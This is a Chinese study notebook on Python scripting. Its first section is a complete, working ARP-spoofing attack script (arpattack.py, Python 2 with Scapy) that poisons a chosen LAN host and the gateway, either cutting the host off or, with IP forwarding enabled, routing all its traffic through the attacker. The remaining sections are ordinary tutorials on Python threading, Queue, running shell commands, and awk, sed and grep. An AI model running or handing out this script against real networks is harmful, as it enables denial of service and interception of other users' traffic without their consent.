# 1、ARP脚本

条件：Python版本为2；Linux环境

while 1:

​	pass

上述代码作用：防止子线程未结束而主线程就已停止

该脚本作用：根据输入IP查找该主机在局域网内是否存活，再ARP欺骗该主机和网关，使该主机无法上网，本机为中间人；若本机开启IP转发，则该主机可以上网，其所有上网流量流经本机

开启IP转发（kali系统）：echo 1 > /proc/sys/net/ipv4/ip_forward

0为关闭，1为开启



arpattack.py

```python
#!/usr/bin/python

import commands
import os
import thread
from scapy.all import *

while 1:
    object_ip = raw_input("Input the host IP you want to attack(input example:  0.0.0.0  ):\t")
    result = os.system("ping %s -c 4 -t 1 | grep -q \"Unreachable\"" %object_ip)
    if(result == 0):
    	print("Host %s is down, please input the correct IP again!" %object_ip)
    	continue
    else:
    	break

my_mac = commands.getoutput("ifconfig | grep ether | awk '{print $2}'")

gateway_ip = commands.getoutput("arp -a | grep _gateway | awk '{print $2}' | awk -F '[()]' '{print $2}'")

gateway_mac = commands.getoutput("arp -a | grep _gateway | awk '{print $4}'")

object_mac = commands.getoutput("arp -a | grep %s | awk '{print $4}'" %object_ip)



def attackGatway(my_mac, gateway_ip, gateway_mac, object_ip):
    ether = Ether(dst = gateway_mac)
    arp = ARP(psrc = object_ip, hwsrc = my_mac, pdst = gateway_ip, hwdst = gateway_mac, op = 2)
    pkg = ether / arp
    pkg.show()
    print("\n------------------------------------------------------------\n")
    srploop(pkg)


def attackOther(my_mac, object_ip, object_mac, gateway_ip):
    ether = Ether(dst = object_mac)
    arp = ARP(psrc = gateway_ip, hwsrc = my_mac, pdst = object_ip, hwdst = object_mac, op = 2)
    pkg = ether / arp
    pkg.show()
    print("\n------------------------------------------------------------\n")
    srploop(pkg)


try:
    thread.start_new_thread(attackGatway, (my_mac, gateway_ip, gateway_mac, object_ip))
    thread.start_new_thread(attackOther, (my_mac, object_ip, object_mac, gateway_ip))

except:
    print("ERROR! Unable to run this script!")


while 1:
    pass
```



# 2、并发线程

## 1.函数方式

调用thread模块中的start_new_thread()来产生线程

语法：

thread.start_new_thread( function, args[, kwargs] )

| 参数     | 说明                              |
| -------- | --------------------------------- |
| function | 欲执行的线程函数                  |
| args     | 传递给线程函数的参数，是tuple类型 |
| kwargs   | 可选参数                          |

以下为菜鸟教程的例子源码

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
 
import thread
import time
 
# 为线程定义一个函数
def print_time( threadName, delay):
   count = 0
   while count < 5:
      time.sleep(delay)
      count += 1
      print "%s: %s" % ( threadName, time.ctime(time.time()) )
 
# 创建两个线程
try:
   thread.start_new_thread( print_time, ("Thread-1", 2, ) )
   thread.start_new_thread( print_time, ("Thread-2", 4, ) )
except:
   print "Error: unable to start thread"
 
while 1:
   pass
```



## 2.类方式

有两个模块：thread 、 threading  都提供了Thread类

### (1)模块thread

thread：提供低级别、原始的线程和简单的锁

### (2)模块threading

threading：提供高级方法

| threading高级方法         | 意义                                                     |
| ------------------------- | -------------------------------------------------------- |
| threading.currentThread() | 返回当前的线程变量                                       |
| threading.enumerate()     | 返回一个包含正在运行的线程的list                         |
| threading.activeCount()   | 返回正在运行的线程数量，等价于len(threading.enumerate()) |

Thread类的方法

| 方法         | 意义               |
| ------------ | ------------------ |
| run()        | 表示线程活动的方法 |
| start()      | 启动线程活动       |
| join([time]) | 等待至线程终止     |
| isAlive()    | 返回线程是否活动的 |
| getName()    | 返回线程名         |
| setName()    | 设置线程名         |

join()：

使主调线程阻塞，知道被调线程运行结束或超时；timeout数值类型，表示超时时间，若无此参数，主调线程将一直阻塞到被调线程结束



两种锁：

threading.RLock()		允许在同一线程中被多次acquire，但acquire和release要成对出现

threading.Lock()	  不允许



以下为菜鸟教程的例子源码

```python
#使用threading模块创建线程，直接从threading.Thread继承，重写__init__方法和run方法

#!/usr/bin/python
# -*- coding: UTF-8 -*-
 
import threading
import time
 
exitFlag = 0
 
class myThread (threading.Thread):   #继承父类threading.Thread
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):                   #把要执行的代码写到run函数里面 线程在创建后会直接运行run函数 
        print "Starting " + self.name
        print_time(self.name, self.counter, 5)
        print "Exiting " + self.name
 
def print_time(threadName, delay, counter):
    while counter:
        if exitFlag:
            (threading.Thread).exit()
        time.sleep(delay)
        print "%s: %s" % (threadName, time.ctime(time.time()))
        counter -= 1
 
# 创建新线程
thread1 = myThread(1, "Thread-1", 1)
thread2 = myThread(2, "Thread-2", 2)
 
# 开启线程
thread1.start()
thread2.start()
 
print "Exiting Main Thread"
```



线程同步（获得锁、释放锁）

以下为菜鸟教程的例子源码

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
 
import threading
import time
 
class myThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        print "Starting " + self.name
       # 获得锁，成功获得锁定后返回True
       # 可选的timeout参数不填时将一直阻塞直到获得锁定
       # 否则超时后将返回False
        threadLock.acquire()
        print_time(self.name, self.counter, 3)
        # 释放锁
        threadLock.release()
 
def print_time(threadName, delay, counter):
    while counter:
        time.sleep(delay)
        print "%s: %s" % (threadName, time.ctime(time.time()))
        counter -= 1
 
threadLock = threading.Lock()
threads = []
 
# 创建新线程
thread1 = myThread(1, "Thread-1", 1)
thread2 = myThread(2, "Thread-2", 2)
 
# 开启新线程
thread1.start()
thread2.start()
 
# 添加线程到线程列表
threads.append(thread1)
threads.append(thread2)
 
# 等待所有线程完成
for t in threads:
    t.join()
print "Exiting Main Thread"
```



以下为其他类似的例子源码

```python
#!/usr/bin/python
# encoding=utf-8
# Filename: thread-extends-class.py
# 直接从Thread继承，创建一个新的class，把线程执行的代码放到这个新的 class里
import threading
import time
  
class ThreadImpl(threading.Thread):
 def __init__(self, num):
  threading.Thread.__init__(self)
  self._num = num
  
 def run(self):
  global total, mutex
   
  # 打印线程名
  print threading.currentThread().getName()
  
  for x in xrange(0, int(self._num)):
   # 取得锁
   mutex.acquire()
   total = total + 1
   # 释放锁
   mutex.release()
  
if __name__ == '__main__':
 #定义全局变量
 global total, mutex
 total = 0
 # 创建锁
 mutex = threading.Lock()
  
 #定义线程池
 threads = []
 # 创建线程对象
 for x in xrange(0, 40):
  threads.append(ThreadImpl(100))
 # 启动线程
 for t in threads:
  t.start()
 # 等待子线程结束
 for t in threads:
  t.join() 
  
 # 打印执行结果
 print total
```

```python
#!/usr/bin/python
# encoding=utf-8
# Filename: thread-function.py
# 创建线程要执行的函数，把这个函数传递进Thread对象里，让它来执行
 
import threading
import time
  
def threadFunc(num):
 global total, mutex
  
 # 打印线程名
 print threading.currentThread().getName()
  
 for x in xrange(0, int(num)):
  # 取得锁
  mutex.acquire()
  total = total + 1
  # 释放锁
  mutex.release()
  
def main(num):
 #定义全局变量
 global total, mutex
 total = 0
 # 创建锁
 mutex = threading.Lock()
  
 #定义线程池
 threads = []
 # 先创建线程对象
 for x in xrange(0, num):
  threads.append(threading.Thread(target=threadFunc, args=(100,)))
 # 启动所有线程
 for t in threads:
  t.start()
 # 主线程中等待所有子线程退出
 for t in threads:
  t.join() 
   
 # 打印执行结果
 print total
  
  
if __name__ == '__main__':
 # 创建40个线程
 main(40)
```

```python
#!/usr/bin/python
# encoding=utf-8
# Filename: put_files_hdfs.py
# 让多条命令并发执行,如让多条scp,ftp,hdfs上传命令并发执行,提高程序运行效率
import datetime
import os
import threading
 
def execCmd(cmd):
 try:
  print "命令%s开始运行%s" % (cmd,datetime.datetime.now())
  os.system(cmd)
  print "命令%s结束运行%s" % (cmd,datetime.datetime.now())
 except Exception, e:
  print '%s\t 运行失败,失败原因\r\n%s' % (cmd,e)
 
if __name__ == '__main__':
 # 需要执行的命令列表
 cmds = ['ls /root',
    'pwd',]
  
 #线程池
 threads = []
  
 print "程序开始运行%s" % datetime.datetime.now()
 
 for cmd in cmds:
  th = threading.Thread(target=execCmd, args=(cmd,))
  th.start()
  threads.append(th)
    
 # 等待线程运行完毕
 for th in threads:
  th.join()
    
 print "程序结束运行%s" % datetime.datetime.now()
```





### (3)模块Queue

模块提供同步的、线程安全的队列类，这些队列都实现了锁原语，可直接使用来实现线程间的同步

| 常用方法                      | 意义                                       |
| ----------------------------- | ------------------------------------------ |
| Queue.qsize()                 | 返回队列的大小                             |
| Queue.empty()                 | 队列为空，返回True；反之False              |
| Queue.full()                  | 队列满，返回True；反之False                |
| Queue.get([block[, timeout]]) | 获取队列，等待时间                         |
| Queue.get_nowait()            | 等价于Queue.get(False)                     |
| Queue.put(item)               | 写入队列，timeout等待时间                  |
| Queue.put_nowait(item)        | 等价于Queue.put(item,False)                |
| Queue.task_done()             | 工作完成后，向任务已完成的队列发送一个信号 |
| Queue.join()                  | 等到队列为空，再执行别的操作               |

以下为菜鸟教程的例子源码

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
 
import Queue
import threading
import time
 
exitFlag = 0
 
class myThread (threading.Thread):
    def __init__(self, threadID, name, q):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.q = q
    def run(self):
        print "Starting " + self.name
        process_data(self.name, self.q)
        print "Exiting " + self.name
 
def process_data(threadName, q):
    while not exitFlag:
        queueLock.acquire()
        if not workQueue.empty():
            data = q.get()
            queueLock.release()
            print "%s processing %s" % (threadName, data)
        else:
            queueLock.release()
        time.sleep(1)
 
threadList = ["Thread-1", "Thread-2", "Thread-3"]
nameList = ["One", "Two", "Three", "Four", "Five"]
queueLock = threading.Lock()
workQueue = Queue.Queue(10)
threads = []
threadID = 1
 
# 创建新线程
for tName in threadList:
    thread = myThread(threadID, tName, workQueue)
    thread.start()
    threads.append(thread)
    threadID += 1
 
# 填充队列
queueLock.acquire()
for word in nameList:
    workQueue.put(word)
queueLock.release()
 
# 等待队列清空
while not workQueue.empty():
    pass
 
# 通知线程是时候退出
exitFlag = 1
 
# 等待所有线程完成
for t in threads:
    t.join()
print "Exiting Main Thread"
```





# 3、python脚本执行shell命令

## 1.模块OS

### (1) os.system()

不能保存执行的结果

输出执行结果；返回且输出状态值（0 或 256），有赋值操作时，只将状态值赋给变量

0         表示操作成功

256    表示操作失败

```python
import os

os.system('ls')
>>>输出ls的结果以及返回状态值0或256（int型）

i = os.system('ls')
>>>输出ls的结果，将返回值0或256赋给i

print i
>>>输出0或256

type(i)
>>>输出int型

os.system('ls | grep no_result')
>>>输出256

j = os.system('ls | grep no_result')
print j
>>>输出256
```



### (2) os.popen()

将执行的结果保存为file类型

无返回状态值

读取结果用read()或readlines()方法

readline()		每次读取一个字符

readlines()	   每次读取一行

~~~python
import os

res = os.popen('ls')
res.read()
>>>输出file类型的结果
res.read().split('\n')
>>>结果以\n分割

for val in res.readlines():
    print val
>>>一行行输出结果
~~~



## 2.模块commands

注意：commands模块在python3中已被弃用

### (1)commands.getoutput(cmd)

只输出cmd结果，不返回状态值

结果的类型是string类型



### (2)commands.getstatus(file)

执行 ls -l file

返回结果，string类型



### (3)commands.getstatusoutput(cmd)

输出状态值和cmd结果，string类型

有赋值操作时，会将状态值和结果一起赋给变量

注意和os.system()的不同



## 3.模块subprocess

注意：

对所有方法，若命令是复杂操作，如 ls -l 等，需要加 shell=True

若有返回状态值

0    成功

1    失败

### (1)subprocess.run()

python3中的方法

执行指定命令，完成后返回一个包含执行结果的CompletedProcess类的实例

```python
import subprocess

val = subprocess.run('ls')
>>>输出ls的结果
val
>>>输出
		CompletedProcess(args='ls', returncode=0)

val = subprocess.run('ls | grep no_result', shell=True)
>>>因为找不到而没有输出
val
>>>输出
		CompletedProcess(args='ls | grep no_result', returncode=1)
```



### (2)subprocess.call()

输出结果，返回且输出状态值

有赋值操作时，输出结果，只将状态值赋给变量



### (3)subprocess.check_call()

python2中的方法

和subprocess.call()相同，且执行失败会抛出异常



# 4、awk、sed、grep详解

## 1.awk

语法格式

~~~shell
awk -F '[分隔符]' '{print $1,$NF}' targetfile

awk 'BEGIN{FS='[列分隔符]+';RS='[行分隔符]+';print '-GEGIN-'} NR==n{动作} END{print '-END-'}'  targetfile
~~~



简单例子

~~~shell
awk '{print $3}' file
默认以空格分割file，输出第三块

awk -F '-' '{print $5}' file
以“-”符号分割file，输出第五块

awk -F '[.|-]' '{print $4}' file
以“.”“|”“-”三个符号一起分割file，输出第四块
~~~



高级例子

```shell
常用概念

NR 代表行数
$n 取某一列
$NF 取最后一列
FS 竖着切，列的分割符
RS 横着切，行的分割符
```



内置变量

| 变量符号    | 代表意义                              |
| ----------- | ------------------------------------- |
| $0          | 完整的输入记录                        |
| ARGC        | 命令行参数的数目                      |
| ARGIND      | 命令行中当前文件的位置（从0开始算）   |
| ARGV        | 包含命令行参数的数组                  |
| CONVFMT     | 数字转换格式，默认值为%.6g            |
| ENVIRON     | 环境变量关联数组                      |
| ERRNO       | 最后一个系统错误的描述                |
| FIELDWIDTHS | 字段宽度列表（用空格键分隔）          |
| FILENAME    | 当前文件名                            |
| FNR         | 同NR，但相对于当前文件                |
| FS          | 字段分隔符（默认是任何空格）          |
| IGNORECASE  | 如果为真，则进行忽略大小写的匹配      |
| NF          | 当前记录中的字段数                    |
| NR          | 当前记录数                            |
| OFMT        | 数字的输出格式，默认值是%.6g          |
| OFS         | 输出字段分隔符，默认值是一个空格      |
| ORS         | 输出记录分隔符，默认值是一个换行符    |
| RLENGTH     | 由match函数所匹配的字符串的长度       |
| RS          | 记录分隔符，默认是一个换行符          |
| RSTART      | 由match函数所匹配的字符串的第一个位置 |
| SUBSEP      | 数组下标分隔符，默认值是\034          |



指定行数

```shell
awk 'NR > 12 && NR < 21' file
or
awk '{if(NR > 12 && NR < 21) print $0}' file

查看file中第13行到20行的所有内容
```



输出行号

~~~shell
awk '{if(NR > 12 && NR < 21) print NR,$0}' file

输出13行到20行的内容，每行内容前加行号


awk 'NR == 13 {print NR,$0}' file

输出第13行的内容，内容前加行号
~~~



指定行数与块数

```shell
awk -F '[:]+' 'NR==2{print $(NF-1)}' /etc/passwd
or
awk 'BEGIN{FS="[:]+"} NR==2{print $(NF-1)}' /etc/passwd

输出指定文件以：分隔的第二行倒数第二块的内容


awk 'BEGIN {RS="/"} {print $0}' /etc/passwd

输出指定文件所有内容，以/作为分隔符，每个字段单独一行
```



切割行

~~~shell
awk 'BEGIN{RS="[/]+"} NR==2 {print NR,$2}' file

以一个或多个/为行的分隔符，打印第二行的第二列，列的分隔符为默认的空格，并打印行号
~~~



指定列、某字符串开头

```shell
awk -F ":" '$5~/^s/{print $0}' file

以：为分隔符，打印第5列以s开头的一整行
```



指定列、某字符串开头，或结尾

```shell
awk '$1~/^(ssh|ftp|mysql)$/{print $1,$2}' /etc/services

以空格符分割列，第1列是以ssh或ftp或mysql作为开头或者结尾，输出第1列和第2列
```



分隔符后面添加+的不同

```shell
echo 6####0@@@@1====2| awk -F '[@#=]' '{print $1,$2,$3,$4}'
输出结果：
6

echo 6####0@@@@1====2| awk -F '[@#=]+' '{print $1,$2,$3,$4}'
输出结果：
6 0 1 2

!!!注意两者的不同，第二个命令多了一个+号
```



统计占比

```shell
awk '/error/{err++}END{print err,NR,err/NR*100"%"}' < xxx.txt

统计一个文件中所有error的占比
```



总结：

- 所有指令都在引号内，一般用单引号，单引号里还包含的引号就用双引号

- /  符号代表指令的一个层层递进
- '[+-]'     作为分隔符，分隔符本身也占用列的位置
- '[+-]+'    作为分隔符，分隔符本身不占用列的位置
- 作具体操作时，用{}包含
- print输出多个列时，列名之间用，分隔
- 单个分隔符，直接用    '单个符号'
- 多个分隔符，用到元组    '[多个符号]'
- ~    代表对列作操作，^代表作为开头，$代表作为结尾



## 2.sed

参数

| 参数 | 含义               |
| ---- | ------------------ |
| -n   | 取消默认输出       |
| -r   | 使用扩展正则表达式 |
| -i   | 刷入磁盘           |
| -e   | 执行多条sed命令    |
| -f   | 指令放在文件里     |



sed指令参数

| 指令符号 | 含义                     |
| -------- | ------------------------ |
| a        | 追加                     |
| i        | 插入                     |
| d        | 删除                     |
| c        | 替换指定的行             |
| s        | 替换每一行匹配到的第一个 |
| g        | 替换每一行的全部         |
| p        | 输出                     |
| w        | 另存文件                 |
| e        | 执行bash命令             |
| q        | 不继续往下读取           |



传入参数一般使用规则的例子

| 例子                              | 解释                                                         |
| --------------------------------- | ------------------------------------------------------------ |
| 10{sed-commands}                  | 对第10行操作                                                 |
| 10,20{sed-commands}               | 对第10到20行操作（包含）                                     |
| 10,+20{sed-commands}              | 对第10到30（10+20）行操作（包含）                            |
| 1~2{sed-commands}                 | 对1，3，5，7，……行操作                                       |
| 10,${sed-commands}                | 对10到最后一行操作，$代表最后一行（包含）                    |
| /string/{sed-commands}            | 对匹配到string的行操作                                       |
| /string1/,/string2/{sed-commands} | 对匹配到string1的行到匹配到string2的行操作                   |
| /string/,${sed-commands}          | 由上可推                                                     |
| /string/,10{sed-commands}         | 对匹配到string的行到第10行操作，前10行无，则显示10行以后的行 |



增删改查

~~~shell
增

a		追加文本到指定行后
i		插入文本到指定行前

单行增加
sed '12a yourstring' file.txt

多行增加
sed '13i yourstring1\nyourstring2' file.txt


-----------------------------------------------------------------------------------------
删

d		删除指定的行

sed 'd' file.txt			删除全部

sed '2d' file.txt			删除第二行

sed '2,5d' file.txt			删除2到5行

其余可用到上表中“传入参数一般使用的例子”进行高级操作


-----------------------------------------------------------------------------------------
改

按行替换
c		用新行替换旧行


sed '2c yourstring' file.txt		替换第2行为yourstring


文本替换
s：		单独使用，将每一行中第一处匹配的字符串进行替换
g：		每一行进行全部替换
-i：		修改文件内容

sed -i 's/str1/str2/g' file.txt
or									str1被替换成str2
sed -i 's#str1#str2#g' file.txt


特殊符号&代表被替换的内容
sed '1,3s#C#---&---#g' file.txt		将1到3行的C替换为---C---，&代表C


-----------------------------------------------------------------------------------------
查

p		输出指定内容，默认输出2次匹配的结果，-n取消默认输出


按行查询
sed '2p' file.txt
sed -n '2p' file.txt
其余格式可参照上表例子


按字符串查询
sed -n '/string/p' file.txt
其余格式可参照上表例子


混合查询
sed -n '2,/string/p' file.txt
其余格式可参照上表例子
~~~



其余功能

~~~shell
备份功能
sed -i.bak '$a yourstring' file.txt
备份file.txt为file.txt.bak，修改源文件，最后一行添加yourstring


另存功能
sed 's/str1/str2/g w file2.txt' file1.txt
将str1替换为str2的整行输出到file2.txt中


大小写转换
\L		全部转换为小写
\l		单个转换为小写
\U		全部转换为大写
\u		单个转换为大写
\E		和\U、\L一起使用，关闭他们功能


执行多条指令
两种方式：分别是-e参数和；
sed -e '3,$d' -e 's/str1/str2/g' file.txt
or
sed '3,$d; s/str1/str2/g' file.txt


操作多个文件
sed '2p' file1.txt file2.txt file3.txt
~~~





## 3.grep

| 参数    | 含义                                                    |
| ------- | ------------------------------------------------------- |
| -V      | 取反，读出指定的内容之外的内容                          |
| -An     | 打印后面n行的内容                                       |
| -Bn     | 打印前面n行的内容                                       |
| -Cn     | 打印前后各n行的内容                                     |
| -n      | 输出行的行号                                            |
| -E      | 使用扩展正则表达式                                      |
| -o      | 只输出匹配到的结果                                      |
| -i      | 忽略大小写                                              |
| -a      | 认为是二进制文件                                        |
| --color | 高亮显示关键字                                          |
| -c      | 统计符合条件的总行数，注意不是次数                      |
| -w      | 精确匹配，条件在文件中作为一个独立单词                  |
| -e      | 同时匹配多个条件，之间是或的关系                        |
| -q      | 静默模式，不输出信息；echo $?查看执行状态，0成功，1失败 |



例子

~~~shell
grep -v "string" file.txt		输出文件中不包含string的内容

grep -E "str1|str2" file.txt		过滤出文件包含str1或str2的行的内容

grep -v '^$' file.txt		消除文件中空行

grep -e "str1" -e "str2" -e "str3" file.txt		同时匹配str1，str2，str3
~~~





# 5、其他

Python2中的输入函数

| 函数        | 规则                                             |
| ----------- | ------------------------------------------------ |
| input()     | 默认输入数字，输入字符串时加双引号               |
| raw_input() | 默认输入字符串，使用数字时强制类型转换  int(...) |



Python3中的输入函数

只有input()，功能等于raw_input()



